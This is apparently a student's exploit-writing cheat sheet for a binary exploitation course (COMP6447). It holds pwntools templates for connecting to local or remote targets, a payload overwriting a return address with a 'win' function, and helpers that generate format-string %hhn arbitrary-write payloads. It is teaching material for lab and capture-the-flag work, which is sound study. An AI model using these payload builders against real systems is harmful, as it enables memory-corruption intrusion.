# COMP6447

## Templates

Generic:
```python

from pwn import *

PROGNAME = "./<name>"
REMOTEIP = "<ip>"
REMOTEPORT = <port>

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf


p.sendline(payload)
p.interactive()
```

## Pwntools 

Fit example
```python
payload = fit({
    offset : p32(elf.symbols["win"])
})
```

## Format strings writing to an address
```python
def get_n(new, prev, size):
    while new <= prev:
        new += (1 << size)
    return new-prev

#Function that returns payload = <base_addr> + <base_addr + 1> + <base_addr + 2> + <base_addr + 3>
def gen_addrs(base_addr):
    addrs = b''
    for i in range(4):
        addrs += p32(base_addr + i)
    return addrs

#Function to return the format string
#Args - address to write, current payload length, printf stack 
def gen_format_writes(to_write, setup_len, stack_offset):
    payload = b''
    n_val = [setup_len]
    for i in range(4):
        n_val += [get_n(to_write[i], sum(n_val[:i+1]), 8)]
        payload += '%{}c'.format(n_val[i+1]).encode()
        payload += '%{}$hhn'.format(stack_offset + i).encode()
        print("Payload part " + str(i) + " = " + str(payload) )
    return payload
```
